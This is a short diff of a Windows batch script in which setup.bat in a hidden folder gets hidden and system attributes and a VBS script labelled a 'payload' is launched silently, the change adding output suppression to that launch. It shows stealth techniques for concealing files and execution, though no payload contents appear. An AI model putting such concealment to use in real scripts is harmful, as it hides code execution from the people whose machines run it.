@@ -51,7 +51,7 @@ REM Set hidden attribute for file
 attrib +h +s "%hiddenFolder1%\setup.bat"
 
 REM Run payload silently and pass %hiddenFolder% variable
-start /B wscript.exe myscript.vbs setup.bat
+start /B wscript.exe myscript.vbs setup.bat >> nul
 goto :eof
 
 :end
